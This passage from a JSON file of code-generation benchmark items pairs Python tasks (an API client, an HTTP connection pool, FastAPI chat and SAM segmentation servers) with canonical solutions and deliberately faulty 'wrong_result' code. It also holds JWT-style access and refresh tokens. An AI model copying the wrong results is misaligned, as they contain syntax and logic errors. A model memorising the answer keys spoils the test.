'eyJ0eXBlIjoiYWNjZXNzIiwia2lkIjUxNDVkYmQtZGNmYi00ZjI4LTg3NzItZjVmNjNlMzcwM2JlIiwiYWxnIjoiRVMyNTYifQ.eyJpYXQiOjE2OTczOTM1MDIsIm5iZiI6MTY5NzM5MzUwMiwiZXhwIjoxNjk3Mzk1MDAyLCJ0eXBlIjoiYWNjZXNzIiwidXNlciI6InN0ZXBoZW4iLCJzdWJzY3JpcHRpb24iOiIzMWNiMGI0Yi0xMjZlLTRlM2MtYTdhMS1lNWRmNDc4YTBjMDUiLCJzZXNzaW9uIjoiMzNiNGRhMzYxZjZiNTM3MjZlYmYyNzU4Iiwic3NuX2V4cCI6MTY5NzQ3OTkwMjMxNSwiaXRlcmF0aW9uIjoiNDEwY2YyZTgyYWZlODdmNDRiMzE4NDFiIn0.kpvrG-ro13P1YeMF6sjLh8wn1rO3jpCVeTrzhDe16ZmJu4ik1amcYz9uQff_XQcwBDrpnCeD5ZZ9mHqb_basew',\n                    'refreshToken': 'eyJ0eXBlIjoicmVmcmVzaCIsImtpZCITQ1ZGJkLWRjZmItNGYyOC04NzcyLWY1ZjYzZTM3MDNiZSIsImFsZyI6IkVTMjU2In0.eyJpYXQiOjE2OTczOTM1MDIsIm5iZiI6MTY5NzM5MzUwMiwiZXhwIjoxNjk3Mzk1MzAyLCJ0eXBlIjoicmVmcmVzaCIsInVzZXIiOiJzdGVwaGVuIiwic3Vic2NyaXB0aW9uIjoiMzFjYjBiNGItMTI2ZS00ZTNjLWE3YTEtZTVkZjQ3OGEwYzA1Iiwic2Vzc2lvbiI6IjMzYjRkYTM2MWY2YjUzNzI2ZWJmMjc1OCIsInNzbl9leHAiOjE2OTc0Nzk5MDIzMTUsIml0ZXJhdGlvbiI6IjQxMGNmMmU4MmFmZTg3ZjQ0YjMxODQxYiJ9.3vVYpTGBjXIejlaacaZOh_59O9ETfbvTCWvldoi0ojyXTRkTmENVpQRbw7av7yMM2jA7SRdEPQGGjYmThCfk9w',\n                    'accessTokenExpires': 1973950023160,\n                    'refreshTokenExpires': 1973953023160}",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import logging\nfrom enum import Enum, auto\n\nclass SXTApiCallTypes(Enum):\n    GET = auto()\n    POST = auto()\n    PUT = auto()\n    DELETE = auto()\n\nclass SXTBaseAPI:\n    def __init__(self, access_token: str = '', logger: logging.Logger = None):\n        self.api_url = 'https://api.spaceandtime.app'\n        self.access_token = access_token\n        self.logger = logger or logging.getLogger(__name__)\n        self.network_calls_enabled = True\n        self.standard_headers = {\n            'Content-Type': 'application/json',\n            'Accept': 'application/json'\n        }\n        self.versions = {\n            'v1': 'https://api.spaceandtime.app/v1',\n            'v2': 'https://api.spaceandtime.app/v2'\n        }\n\n    def call_api(self, endpoint: str, auth_header: bool = True, request_type: str = SXTApiCallTypes.POST, header_parms: dict = {}, data_parms: dict = {}, query_parms: dict = {}, path_parms: dict = {}) -> tuple[bool, dict]:\n        try:\n            if not self.network_calls_enabled:\n                return False, self.__fakedata__(endpoint)\n            \n            url = self._construct_url(endpoint)\n            headers = self._construct_headers(header_parms, auth_header)\n            response = self._make_request(url, headers, request_type, data_parms, query_parms, path_parms)\n            \n            if response.status_code >= 400:\n                self.logger.error(f\"API call failed: {response.status_code} - {response.text}\")\n                return False, {}\n            \n            self.logger.info(f\"API call successful: {response.status_code} - {response.text}\")\n            return True, response.json()\n        \n        except Exception as e:\n            self.logger.error(f\"Error during API call: {str(e)}\")\n            return False, {}\n\n    def _construct_url(self, endpoint: str) -> str:\n        version = self._get_version(endpoint)\n        return f\"{self.versions[version]}/{endpoint}\"\n\n    def _get_version(self, endpoint: str) -> str:\n        for version, base_url in self.versions.items():\n            if endpoint.startswith(base_url + '/'):\n                return version\n        return 'v1'\n\n    def _construct_headers(self, header_parms: dict = {}, auth_header: bool = True) -> dict:\n        headers = self.standard_headers.copy()\n        headers.update(header_parms)\n        \n        if auth_header and self.access_token:\n            headers['Authorization'] = f'Bearer {self.access_token}'\n        \n        return headers\n\n    def _make_request(self, url: str, headers: dict, request_type: str, data_parms: dict = {}, query_parms: dict = {}, path_parms: dict = {}) -> dict:\n        import requests\n        \n        if request_type == SXTApiCallTypes.GET:\n            response = requests.get(url, headers=headers, params=query_parms, params=path_parms)\n        elif request_type == SXTApiCallTypes.POST:\n            response = requests.post(url, headers=headers, json=data_parms, params=query_parms, params=path_parms)\n        elif request_type == SXTApiCallTypes.PUT:\n            response = requests.put(url, headers=headers, json=data_parms, params=query_parms, params=path_parms)\n        elif request_type == SXTApiCallTypes.DELETE:\n            response = requests.delete(url, headers=headers, params=query_parms, params=path_parms)\n        else:\n            raise ValueError(f\"Unsupported request type: {request_type}\")\n        \n        return response\n\n    def __fakedata__(self, endpoint: str) -> dict:\n        return {\n            \"status\": \"success\",\n            \"data\": {\n                \"message\": f\"Mock response for endpoint: {endpoint}\",\n                \"version\": \"v1\"\n            }\n        }"
  },
  {
    "Task_id": 12,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, with support for timeouts and retries.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that maintains a pool of reusable connections to a specified host and port. It handles connection lifecycle, including creation, retrieval, release, and cleanup, with support for connection timeouts and retry mechanisms.\n\nAttributes:\n- scheme: str - The URL scheme (default 'http')\n- ConnectionCls: class - The connection class to use (default HTTPConnection)\n- ResponseCls: class - The response class to use (default HTTPResponse)\n- host: str - The target host for connections\n- port: int - The target port for connections\n- timeout: Timeout - Default timeout configuration\n- retries: Retry - Default retry configuration\n- pool: queue.LifoQueue - The connection pool storage\n- block: bool - Whether to block when pool is full\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with given parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool or closes it if pool is full\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw) -> HTTPResponse - Main method to open a URL using a connection from the pool",
    "Canonical_solution": "from socket import error as SocketError, timeout as SocketTimeout\nimport socket\nfrom .connection import HTTPConnection, HTTPSConnection, VerifiedHTTPSConnection\nfrom .response import HTTPResponse\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import get_host, Url\nfrom .exceptions import (\n    ClosedPoolError,\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n    ProtocolError,\n    HTTPException,\n    BaseSSLError,\n    CertificateError,\n    NewConnectionError\n)\nfrom .packages import six\nfrom .packages.six.moves import queue\nimport warnings\nimport logging\n\nlog = logging.getLogger(__name__)\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n    ResponseCls = HTTPResponse\n\n    def __init__(self, host, port=None, strict=False,\n                 timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False,\n                 headers=None, retries=None,\n                 _proxy=None, _proxy_headers=None,\n                 **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = queue.LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n        for _ in six.moves.xrange(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool reached maximum size and no more connections are allowed.\")\n            return self._new_conn()\n\n        if conn and is_connection_dropped(conn):\n            conn.close()\n            conn = None\n\n        return conn or self._new_conn()\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            raise ReadTimeoutError(self, url, \"Read timed out.\")\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, 'sock', None):\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            raise ReadTimeoutError(self, url, \"Read timed out.\")\n\n        return httplib_response\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None,\n                redirect=True, assert_same_host=True, timeout=_Default,\n                pool_timeout=None, release_conn=None, **response_kw):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn, method, url, timeout=timeout_obj,\n                body=body, headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (TimeoutError, HTTPException, SocketError, ProtocolError,\n                BaseSSLError, SSLError, CertificateError) as e:\n            if conn:\n                conn.close()\n            raise MaxRetryError(self, url, e)\n\n        finally:\n            if release_conn:\n                self._put_conn(conn)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import socket\nimport time\nfrom urllib3 import Timeout, Retry\nfrom urllib3.connection import HTTPConnection\nfrom urllib3.response import HTTPResponse\nfrom urllib3.util import urlsplit\nfrom urllib3.util.timeout import DefaultTimeout\nfrom urllib3.util.proxy import ProxyManager\nfrom urllib3.util.queue import LifoQueue\nfrom urllib3.util.retry import Retry\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=DefaultTimeout(), maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = 'http'\n        self.ConnectionCls = HTTPConnection\n        self.ResponseCls = HTTPResponse\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries or Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])\n        self.pool = LifoQueue(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n        self.headers = headers or {}\n\n    def _new_conn(self):\n        conn = self.ConnectionCls(host=self.host, port=self.port, **self.conn_kw)\n        return conn\n\n    def _get_conn(self, timeout=None):\n        if timeout is None:\n            timeout = self.timeout\n        if self.block:\n            conn = self.pool.get(timeout=timeout)\n        else:\n            try:\n                conn = self.pool.get(timeout=timeout)\n            except Exception:\n                conn = self._new_conn()\n        return conn\n\n    def _put_conn(self, conn):\n        if self.pool.full():\n            conn.close()\n        else:\n            self.pool.put(conn)\n\n    def _make_request(self, conn, method, url, timeout=DefaultTimeout(), **httplib_request_kw):\n        try:\n            return conn.request(method, url, **httplib_request_kw)\n        except socket.error as e:\n            if self.retries.total > 0:\n                self.retries.reset()\n                self.retries.increment()\n                time.sleep(self.retries.backoff_factor)\n                return self._make_request(conn, method, url, timeout=timeout, **httplib_request_kw)\n            else:\n                raise\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=DefaultTimeout(), pool_timeout=None, release_conn=None, **response_kw):\n        if retries is None:\n            retries = self.retries\n        if not headers:\n            headers = self.headers\n        if not url:\n            raise ValueError(\"URL cannot be empty\")\n        if not self.scheme:\n            raise ValueError(\"Scheme is not set\")\n        if not self.host:\n            raise ValueError(\"Host is not set\")\n        if not self.port:\n            raise ValueError(\"Port is not set\")\n        if not self.ConnectionCls:\n            raise ValueError(\"Connection class is not set\")\n        if not self.ResponseCls:\n            raise ValueError(\"Response class is not set\")\n        if not self.pool:\n            raise ValueError(\"Connection pool is not set\")\n        if not self.block:\n            raise ValueError(\"Block is not set\")\n        if not self.timeout:\n            raise ValueError(\"Timeout is not set\")\n        if not self.retries:\n            raise ValueError(\"Retries is not set\")\n        if not self.proxy:\n            raise ValueError(\"Proxy is not set\")\n        if not self.proxy_headers:\n            raise ValueError(\"Proxy headers are not set\")\n        if not self.conn_kw:\n            raise ValueError(\"Connection parameters are not set\")\n        if not self.headers:\n            raise ValueError(\"Headers are not set\")\n        if not self.scheme:\n            raise ValueError(\"Scheme is not set\")\n        if not self.host:\n            raise ValueError(\"Host is not set\")\n        if not self.port:\n            raise ValueError(\"Port is not set\")\n        if not self.ConnectionCls:\n            raise ValueError(\"Connection class is not set\")\n        if not self.ResponseCls:\n            raise ValueError(\"Response class is not set\")\n        if not self.pool:\n            raise ValueError(\"Connection pool is not set\")\n        if not self.block:\n            raise ValueError(\"Block is not set\")\n        if not self.timeout:\n            raise ValueError(\"Timeout is not set\")\n        if not self.retries:\n            raise ValueError(\"Retries is not set\")\n        if not self.proxy:\n            raise ValueError(\"Proxy is not set\")\n        if not self.proxy_headers:\n            raise ValueError(\"Proxy headers are not set\")\n        if not self.conn_kw:\n            raise ValueError(\"Connection parameters are not set\")\n        if not self.headers:\n            raise ValueError(\"Headers are not set\")"
  },
  {
    "Task_id": 122,
    "Instruction": "Task Description: Implement a FastAPI-based HTTP server for handling conversational AI queries and chat interactions, with support for both direct queries and streaming chat responses.\n\nClass Description: RayAssistantDeployment is a class that encapsulates the functionality for handling HTTP requests in a conversational AI service. It provides endpoints for direct queries (/query) and chat interactions (/chat), with support for streaming responses in chat mode.\n\nAttributes:\n\napp: FastAPI - The FastAPI application instance that handles HTTP requests and routes.\n\nMethods:\n\n__init__: [Name](app: FastAPI) -> None - Initializes the class with a FastAPI app instance and registers the query and chat endpoints.\n\npredict: [Name](query: Query, stream: bool) -> Dict[str, Any] - Internal prediction method that processes the input query and returns a dictionary containing the AI response (implementation would be provided separately).\n\nquery: [Name](query: Query) -> Answer - Handles POST requests to the /query endpoint, processes the query using predict, and returns an Answer object containing the response.\n\nproduce_chat_answer: [Name](request: Request, result: Dict[str, Any]) -> Generator[str, None, None] - Generator function that yields chat response pieces and sources for streaming.\n\nchat: [Name](request: Request) -> StreamingResponse - Handles POST requests to the /chat endpoint, processes the conversation using predict (with streaming enabled for single messages), and returns a streaming response.",
    "Canonical_solution": "from fastapi import FastAPI\nfrom pydantic import BaseModel, Field\nfrom starlette.responses import StreamingResponse\nfrom typing import List, Dict, Any\n\nclass Message(BaseModel):\n    role: str = Field(\n        ..., description=\"The role of the author of the message, typically 'user', or 'assistant'.\"\n    )\n    content: str = Field(..., description=\"The content of the message.\")\n\nclass Request(BaseModel):\n    messages: List[Message] = Field(\n        ..., description=\"A list of messages that make up the conversation.\"\n    )\n\nclass Query(BaseModel):\n    query: str\n\nclass Answer(BaseModel):\n    question: str\n    answer: str\n    sources: List[str]\n    llm: str\n\nclass RayAssistantDeployment:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self.app.post(\"/query\")(self.query)\n        self.app.post(\"/chat\")(self.chat)\n\n    def predict(self, query: Query, stream: bool) -> Dict[str, Any]:\n        # Implementation would go here\n        pass\n\n    def query(self, query: Query) -> Answer:\n        result = self.predict(query, stream=False)\n        return Answer.parse_obj(result)\n\n    def produce_chat_answer(self, request: Request, result: Dict[str, Any]):\n        answer = []\n        for answer_piece in result[\"answer\"]:\n            answer.append(answer_piece)\n            yield answer_piece\n\n        if result[\"sources\"]:\n            yield \"\\n\\n**Sources:**\\n\"\n            for source in result[\"sources\"]:\n                yield \"* \" + source + \"\\n\"\n\n    def chat(self, request: Request) -> StreamingResponse:\n        if len(request.messages) == 1:\n            query = Query(query=request.messages[0].content)\n            result = self.predict(query, stream=True)\n        else:\n            # Simplified implementation for follow-up questions\n            result = {\"answer\": [\"Response\"], \"llm\": \"gpt-4\", \"sources\": [], \"document_ids\": []}\n\n        return StreamingResponse(\n            self.produce_chat_answer(request, result), media_type=\"text/plain\"\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "from fastapi import FastAPI, Request, Response\nfrom fastapi.responses import StreamingResponse\nfrom typing import Dict, Any, Generator, Optional\n\nclass RayAssistantDeployment:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self.app.post(\"/query\")(self.query)\n        self.app.post(\"/chat\")(self.chat)\n\n    def predict(self, query: Dict[str, Any], stream: bool) -> Dict[str, Any]:\n        # Placeholder for actual prediction logic\n        return {\"response\": \"This is a simulated response.\", \"sources\": [\"source1\", \"source2\"]}\n\n    def query(self, request: Request) -> Dict[str, Any]:\n        data = await request.json()\n        result = self.predict(data, stream=False)\n        return {\"answer\": result[\"response\"], \"sources\": result[\"sources\"]}\n\n    def produce_chat_answer(self, request: Request, result: Dict[str, Any]) -> Generator[str, None, None]:\n        yield \"Data: \" + str(result)\n        for part in result.get(\"response\", []):\n            yield \"Part: \" + part\n\n    def chat(self, request: Request) -> StreamingResponse:\n        data = await request.json()\n        result = self.predict(data, stream=True)\n        return StreamingResponse(self.produce_chat_answer(request, result), media_type=\"text/event-stream\")"
  },
  {
    "Task_id": 123,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server for handling image segmentation and processing requests using SAM (Segment Anything Model) and related models.\n\nClass Description: SamAPI is a class that encapsulates all the route handlers for a FastAPI application dealing with image segmentation tasks. It provides endpoints for model prediction, mask dilation, and various segmentation techniques.\n\nAttributes:\n- app: FastAPI - The FastAPI application instance that will handle HTTP requests\n\nMethods:\n- __init__(app: FastAPI) -> None - Initializes the SamAPI class with a FastAPI instance and sets up routes\n- _setup_routes() -> None - Private method that defines all API endpoints and their handlers\n\nRoute Handlers (methods defined within _setup_routes):\n- heartbeat() -> Dict - Simple health check endpoint\n- api_sam_model() -> List[str] - Returns available SAM models\n- api_sam_predict(payload: SamPredictRequest) -> Any - Handles SAM model prediction requests\n- api_dino_predict(payload: DINOPredictRequest) -> Any - Handles DINO model prediction requests\n- api_dilate_mask(payload: DilateMaskRequest) -> Any - Handles mask dilation requests\n- api_controlnet_seg(payload: ControlNetSegRequest, autosam_conf: AutoSAMConfig) -> Any - Handles ControlNet segmentation requests\n- api_category_mask(payload: CategoryMaskRequest, autosam_conf: AutoSAMConfig) -> Any - Handles category-specific mask generation requests\n\nSupporting Models (Pydantic BaseModel classes):\n- SamPredictRequest - Request model for SAM predictions\n- DINOPredictRequest - Request model for DINO predictions\n- DilateMaskRequest - Request model for mask dilation\n- AutoSAMConfig - Configuration model for AutoSAM parameters\n- ControlNetSegRequest - Request model for ControlNet segmentation\n- CategoryMaskRequest - Request model for category-specific masking",
    "Canonical_solution": "from fastapi import FastAPI, Body\nfrom pydantic import BaseModel\nfrom typing import Any, Optional, List\nfrom PIL import Image\nimport numpy as np\nimport os\n\nclass SamAPI:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self._setup_routes()\n\n    class SamPredictRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        input_image: str\n        sam_positive_points: List[List[float]] = []\n        sam_negative_points: List[List[float]] = []\n        dino_enabled: bool = False\n        dino_model_name: Optional[str] = \"GroundingDINO_SwinT_OGC (694MB)\"\n        dino_text_prompt: Optional[str] = None\n        dino_box_threshold: Optional[float] = 0.3\n        dino_preview_checkbox: bool = False\n        dino_preview_boxes_selection: Optional[List[int]] = None\n\n    class DINOPredictRequest(BaseModel):\n        input_image: str\n        dino_model_name: str = \"GroundingDINO_SwinT_OGC (694MB)\"\n        text_prompt: str\n        box_threshold: float = 0.3\n\n    class DilateMaskRequest(BaseModel):\n        input_image: str\n        mask: str\n        dilate_amount: int = 10\n\n    class AutoSAMConfig(BaseModel):\n        points_per_side: Optional[int] = 32\n        points_per_batch: int = 64\n        pred_iou_thresh: float = 0.88\n        stability_score_thresh: float = 0.95\n        stability_score_offset: float = 1.0\n        box_nms_thresh: float = 0.7\n        crop_n_layers: int = 0\n        crop_nms_thresh: float = 0.7\n        crop_overlap_ratio: float = 512 / 1500\n        crop_n_points_downscale_factor: int = 1\n        min_mask_region_area: int = 0\n\n    class ControlNetSegRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        input_image: str\n        processor: str = \"seg_ofade20k\"\n        processor_res: int = 512\n        pixel_perfect: bool = False\n        resize_mode: Optional[int] = 1\n        target_W: Optional[int] = None\n        target_H: Optional[int] = None\n\n    class CategoryMaskRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        processor: str = \"seg_ofade20k\"\n        processor_res: int = 512\n        pixel_perfect: bool = False\n        resize_mode: Optional[int] = 1\n        target_W: Optional[int] = None\n        target_H: Optional[int] = None\n        category: str\n        input_image: str\n\n    def _setup_routes(self):\n        @self.app.get(\"/sam/heartbeat\")\n        async def heartbeat():\n            return {\"msg\": \"Success!\"}\n\n        @self.app.get(\"/sam/sam-model\")\n        async def api_sam_model() -> List[str]:\n            return sam_model_list\n\n        @self.app.post(\"/sam/sam-predict\")\n        async def api_sam_predict(payload: SamPredictRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image).convert('RGBA')\n            sam_output_mask_gallery, sam_message = sam_predict(\n                payload.sam_model_name,\n                payload.input_image,\n                payload.sam_positive_points,\n                payload.sam_negative_points,\n                payload.dino_enabled,\n                payload.dino_model_name,\n                payload.dino_text_prompt,\n                payload.dino_box_threshold,\n                payload.dino_preview_checkbox,\n                payload.dino_preview_boxes_selection)\n            result = {\"msg\": sam_message}\n            if len(sam_output_mask_gallery) == 9:\n                result[\"blended_images\"] = list(map(encode_to_base64, sam_output_mask_gallery[:3]))\n                result[\"masks\"] = list(map(encode_to_base64, sam_output_mask_gallery[3:6]))\n                result[\"masked_images\"] = list(map(encode_to_base64, sam_output_mask_gallery[6:]))\n            return result\n\n        @self.app.post(\"/sam/dino-predict\")\n        async def api_dino_predict(payload: DINOPredictRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            dino_output_img, _, dino_msg = dino_predict(\n                payload.input_image,\n                payload.dino_model_name,\n                payload.text_prompt,\n                payload.box_threshold)\n            return {\n                \"msg\": dino_msg[\"value\"] if \"value\" in dino_msg else \"Done\",\n                \"image_with_box\": encode_to_base64(dino_output_img) if dino_output_img is not None else None,\n            }\n\n        @self.app.post(\"/sam/dilate-mask\")\n        async def api_dilate_mask(payload: DilateMaskRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image).convert(\"RGBA\")\n            payload.mask = decode_to_pil(payload.mask)\n            dilate_result = list(map(encode_to_base64, update_mask(payload.mask, 0, payload.dilate_amount, payload.input_image)))\n            return {\"blended_image\": dilate_result[0], \"mask\": dilate_result[1], \"masked_image\": dilate_result[2]}\n\n        @self.app.post(\"/sam/controlnet-seg\")\n        async def api_controlnet_seg(payload: ControlNetSegRequest = Body(...),\n                                    autosam_conf: AutoSAMConfig = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            cnet_seg_img, cnet_seg_msg = cnet_seg(\n                payload.sam_model_name,\n                payload.input_image,\n                payload.processor,\n                payload.processor_res,\n                payload.pixel_perfect,\n                payload.resize_mode,\n                payload.target_W,\n                payload.target_H,\n                autosam_conf.points_per_side,\n                autosam_conf.points_per_batch,\n                autosam_conf.pred_iou_thresh,\n                autosam_conf.stability_score_thresh,\n                autosam_conf.stability_score_offset,\n                autosam_conf.box_nms_thresh,\n                autosam_conf.crop_n_layers,\n                autosam_conf.crop_nms_thresh,\n                autosam_conf.crop_overlap_ratio,\n                autosam_conf.crop_n_points_downscale_factor,\n                autosam_conf.min_mask_region_area)\n            cnet_seg_img = list(map(encode_to_base64, cnet_seg_img))\n            result = {\"msg\": cnet_seg_msg}\n            if len(cnet_seg_img) == 3:\n                result[\"blended_images\"] = cnet_seg_img[0]\n                result[\"random_seg\"] = cnet_seg_img[1]\n                result[\"edit_anything_control\"] = cnet_seg_img[2]\n            elif len(cnet_seg_img) == 4:\n                result[\"sem_presam\"] = cnet_seg_img[0]\n                result[\"sem_postsam\"] = cnet_seg_img[1]\n                result[\"blended_presam\"] = cnet_seg_img[2]\n                result[\"blended_postsam\"] = cnet_seg_img[3]\n            return result\n\n        @self.app.post(\"/sam/category-mask\")\n        async def api_category_mask(payload: CategoryMaskRequest = Body(...),\n                                  autosam_conf: AutoSAMConfig = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            category_mask_img, category_mask_msg, resized_input_img = categorical_mask(\n                payload.sam_model_name,\n                payload.processor,\n                payload.processor_res,\n                payload.pixel_perfect,\n                payload.resize_mode,\n                payload.target_W,\n                payload.target_H,\n                payload.category,\n                payload.input_image,\n                autosam_conf.points_per_side,\n                autosam_conf.points_per_batch,\n                autosam_conf.pred_iou_thresh,\n                autosam_conf.stability_score_thresh,\n                autosam_conf.stability_score_offset,\n                autosam_conf.box_nms_thresh,\n                autosam_conf.crop_n_layers,\n                autosam_conf.crop_nms_thresh,\n                autosam_conf.crop_overlap_ratio,\n                autosam_conf.crop_n_points_downscale_factor,\n                autosam_conf.min_mask_region_area)\n            category_mask_img = list(map(encode_to_base64, category_mask_img))\n            result = {\"msg\": category_mask_msg}\n            if len(category_mask_img) == 3:\n                result[\"blended_image\"] = category_mask_img[0]\n                result[\"mask\"] = category_mask_img[1]\n                result[\"masked_image\"] = category_mask_img[2]\n            if resized_input_img is not None:\n                result[\"resized_input\"] = encode_to_base64(resized_input_img)\n            return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "from fastapi import FastAPI, HTTPException\nfrom pydantic import BaseModel\nimport numpy as np\nfrom typing import List, Dict, Any, Optional\nimport io\nfrom PIL import Image\nimport torch\nimport torchvision.transforms as T\nfrom segment_anything import sam_model_registry, SamPredictor\nfrom auto_sam import AutoSAM\n\nclass SamPredictRequest(BaseModel):\n    image: bytes\n    input_boxes: List[List[float]]\n    input_masks: Optional[List[np.ndarray]] = None\n    input_points: Optional[List[List[float]]] = None\n    input_labels: Optional[List[int]] = None\n    task: str = \"segmentation\"\n\nclass DINOPredictRequest(BaseModel):\n    image: bytes\n    input_boxes: List[List[float]]\n    input_masks: Optional[List[np.ndarray]] = None\n    input_points: Optional[List[List[float]]] = None\n    input_labels: Optional[List[int]] = None\n    task: str = \"segmentation\"\n\nclass DilateMaskRequest(BaseModel):\n    image: bytes\n    mask: bytes\n    dilation_radius: int = 5\n\nclass AutoSAMConfig(BaseModel):\n    model_type: str = \"vit_b\"\n    input_size: int = 1024\n    num_classes: int = 1000\n    use_ckpt: bool = True\n    ckpt_path: str = \"auto_sam_vit_b_01e9.pth\"\n    device: str = \"cuda\"\n\nclass ControlNetSegRequest(BaseModel):\n    image: bytes\n    input_boxes: List[List[float]]\n    input_masks: Optional[List[np.ndarray]] = None\n    input_points: Optional[List[List[float]]] = None\n    input_labels: Optional[List[int]] = None\n    task: str = \"segmentation\"\n\nclass CategoryMaskRequest(BaseModel):\n    image: bytes\n    category: str\n    task: str = \"segmentation\"\n\nclass SamAPI:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.get(\"/heartbeat\")\n        async def heartbeat() -> Dict[str, str]:\n            return {\"status\": \"healthy\"}\n\n        @self.app.get(\"/api/sam/models\")\n        async def api_sam_model() -> List[str]:\n            return [\"vit_b\", \"vit_l\", \"vit_h\"]\n\n        @self.app.post(\"/api/sam/predict\")\n        async def api_sam_predict(payload: SamPredictRequest) -> Any:\n            try:\n                # Load image\n                image = Image.open(io.BytesIO(payload.image)).convert(\"RGB\")\n                transform = T.Compose([\n                    T.Resize(1024),\n                    T.CenterCrop(1024),\n                    T.ToTensor(),\n                    T.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),\n                ])\n                image_tensor = transform(image).unsqueeze(0).to(\"cuda\")\n\n                # Initialize SAM model\n                sam = sam_model_registry[payload.task](checkpoint=\"sam_vit_b_01ec63.pth\")\n                sam.to(\"cuda\")\n                predictor = SamPredictor(sam)\n                predictor.set_image(image_tensor.cpu().numpy())\n\n                # Process input boxes\n                input_boxes = np.array(payload.input_boxes, dtype=np.float32)\n                if len(input_boxes) == 0:\n                    input_boxes = np.zeros((1, 4), dtype=np.float32)\n\n                # Process input masks\n                input_masks = []\n                if payload.input_masks:\n                    for mask in payload.input_masks:\n                        input_masks.append(np.array(mask, dtype=np.float32))\n\n                # Process input points\n                input_points = []\n                if payload.input_points:\n                    for point in payload.input_points:\n                        input_points.append(np.array(point, dtype=np.float32))\n\n                # Process input labels\n                input_labels = []\n                if payload.input_labels:\n                    for label in payload.input_labels:\n                        input_labels.append(np.array(label, dtype=np.int32))\n\n                # Run prediction\n                with torch.no_grad():\n                    masks, scores, logits = predictor.predict(\n                        box=input_boxes,\n                        mask_input=np.array(input_masks),\n                        point_input=np.array(input_points),\n                        label_input=np.array(input_labels),\n                        output_mode=\"mask\"\n                    )\n\n                # Convert masks to 